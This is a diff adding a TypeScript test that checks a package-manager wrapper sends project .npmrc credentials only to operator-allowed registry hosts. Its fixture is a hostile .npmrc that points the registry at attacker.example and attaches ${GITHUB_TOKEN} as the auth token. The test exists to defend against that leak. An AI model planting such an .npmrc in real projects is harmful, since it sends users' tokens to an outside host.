@@ -56,6 +56,60 @@ describe("install engine boundary", () => {
     }
   )
 
+  /**
+   * A project `.npmrc` names the host its credential goes to. The operator's
+   * `SMITHERS_NPM_CREDENTIAL_HOSTS`, never the checkout, decides which hosts
+   * may receive one.
+   */
+  it.skipIf(process.platform === "win32")(
+    "binds .npmrc credentials only to operator-allowed registry hosts",
+    async () => {
+      const root = await mkdtemp(join(tmpdir(), "smithers-credential-hosts-"))
+      try {
+        await writeFile(
+          join(root, ".npmrc"),
+          "registry=https://attacker.example/\n//attacker.example/:_authToken=${GITHUB_TOKEN}\n"
+        )
+        const executable = join(root, "pnpm-probe.mjs")
+        const observed = join(root, "observed")
+        await writeFile(
+          executable,
+          `#!/usr/bin/env node\nimport { writeFileSync } from "node:fs"\n` +
+            `writeFileSync(${JSON.stringify(observed)}, String(process.env.GITHUB_TOKEN))\n` +
+            `process.stdout.write("11.21.0\\n")\n`
+        )
+        await chmod(executable, 0o755)
+        const toolchain = {
+          manager: "pnpm" as const,
+          managerVersion: ">=0.0.0",
+          managerExecutable: executable,
+          runtime: "node" as const,
+          runtimeVersion: ">=0.0.0",
+          runtimeExecutable: undefined
+        }
+        const versionWith = (extra: Record<string, string>) =>
+          Effect.runPromise(
+            Effect.flatMap(PackageManager.PackageManager, (manager) => manager.version).pipe(
+              Effect.provide(
+                layerPackageManager(root, toolchain, [], {
+                  PATH: process.env.PATH,
+                  GITHUB_TOKEN: "host-secret",
+                  ...extra
+                })
+              ),
+              Effect.provide(layerNonInteractiveNodeServices)
+            )
+          )
+        await expect(versionWith({})).rejects.toThrow(/outside credentialHosts/)
+        await expect(readFile(observed, "utf8")).rejects.toMatchObject({ code: "ENOENT" })
+        await versionWith({ SMITHERS_NPM_CREDENTIAL_HOSTS: "registry.npmjs.org, attacker.example" })
+        expect(await readFile(observed, "utf8")).toBe("host-secret")
+      } finally {
+        await rm(root, { force: true, recursive: true })
+      }
+    }
+  )
+
   it("withholds default and workspace-declared cache credentials from package managers", () => {
     const environment = packageManagerEnvironment(
       {
